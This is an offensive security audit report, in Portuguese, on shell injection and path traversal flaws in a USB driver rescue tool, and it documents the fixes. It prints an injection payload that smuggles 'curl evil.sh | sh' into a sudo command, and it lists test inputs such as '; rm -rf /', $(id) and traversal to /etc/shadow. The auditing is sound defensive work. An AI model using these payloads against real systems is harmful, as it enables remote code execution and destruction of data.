# Auditoria de segurança ofensiva — agosto/2026

**Escopo:** `dongle-driver-rescue`, invariantes S1–S7 do
[ADR 0002](adr/0002-seguranca-supply-chain.md).
**Método:** ataque executado contra o código real, não revisão de leitura.
Cada payload foi montado, rodado e o resultado observado.

---

## Resumo

| | |
|---|---|
| Achados **críticos** | **7** (todos corrigidos) |
| Achados médios | 2 (corrigidos) |
| Invariantes que resistiram | S3 (caminho de firmware), S1 (comando de pacote), S2 (allowlist) |
| Testes de regressão adicionados | 45 |

O achado central não foi um validador fraco: foi um validador **correto que não
era chamado**. `require_module_name` existia, cobria exatamente o caso, e o
caminho que monta comandos com `sudo` não passava por ele.

---

## CRÍTICO-1 — Injeção de shell em comando com `sudo` (S1, S6)

`plan_state_b` interpolava o nome do módulo direto em strings de shell:

```python
f"echo '{vid} {pid}' | sudo tee /sys/bus/usb/drivers/{module}/new_id"
f"printf '...' '{alias.strip()}' | sudo tee -a {conf_path}"
```

O valor de `module` chega de **três origens não confiáveis**:

| Origem | Procedência |
|---|---|
| `bound_driver` | lido do **sysfs** do host |
| `loaded_module` | lido do host |
| `preferred_module` / `new_id_modules` | JSON da base de conhecimento |

Nenhuma era validada. Uma aspa simples no nome fecha o quoting e emenda comando
arbitrário — numa linha que **o próprio produto instrui o usuário a rodar com
`sudo`**:

```
echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id
```

Payloads confirmados funcionando antes da correção: aspa simples, `$(id)`,
backtick, travessia de caminho (`../../../../etc/cron.d/evil`) e nova linha.

Isso contraria diretamente o S1 declarado no ADR: *"nenhum comando ou path
concatenado sem passar pela camada de validação S2/S3"*.

**Correção:** `module = require_module_name(module)` antes de qualquer
interpolação. 24 testes de regressão (8 payloads × 3 origens).

---

## MÉDIO-1 — Gramática aceitava módulo iniciado por hífen (S3)

`[a-z0-9_-]{1,64}` aceitava `-rf`, `--force`. Usado como **argumento** de
comando, um nome desses deixa de ser nome e vira flag. Nenhum módulo real do
kernel começa com hífen.

**Correção:** `[a-z0-9][a-z0-9_-]{0,63}`.

---

## MÉDIO-2 — Rollback validava um caminho e não o outro (S6)

Na mesma função `plan_rollback`, dois pesos:

```python
# remove_file — rigoroso
if not (isinstance(path, str) and path.startswith("/")
        and os.path.normpath(path) == path):
    raise ValueError(...)

# remove_new_id — só "é string não vazia"
if not isinstance(driver, str) or not driver or not isinstance(vid_pid, str):
    raise ValueError(...)
```

`driver="x; id"` passava. O journal fica em disco e pode ser adulterado: é
entrada não confiável como qualquer outra.

**Correção:** `require_module_name` no driver e regex de `vid:pid` hex.

---

## O que resistiu

Atacado e **não** quebrou:

- **Travessia de diretório em firmware (S3)** — 13 payloads rejeitados:
  `../../../etc/shadow`, `/etc/passwd`, `..\..\windows`, `a/../../b`,
  `....//....//`, byte nulo, backslash. Caminhos legítimos seguem aceitos.
- **Comando de instalação de pacote (S1)** — 9 payloads rejeitados
  (`; rm -rf /`, `&&`, `-y`, `$(id)`, pipe, nova linha) e gerenciador fora da
  allowlist recusado (S2).
- **Contenção de symlink** — `os.path.commonpath` impede escapar da raiz de
  firmware.
- **SPEC §37** — o produto continua sem executar reparo algum.

---

## Ressalva de método

A auditoria cobriu as superfícies que recebem entrada não confiável e montam
comando ou caminho. **Não** cobriu: teste com dongle USB físico conectado,
fuzzing prolongado dos parsers, nem análise do binário empacotado.

O padrão que se repete neste repositório merece registro: os 186 testes
passavam com o CLI inteiramente inoperante, e passavam também com a injeção de
shell acima. Testes que injetam apenas dependências falsas não exercitam o
caminho por onde entra o dado hostil real.
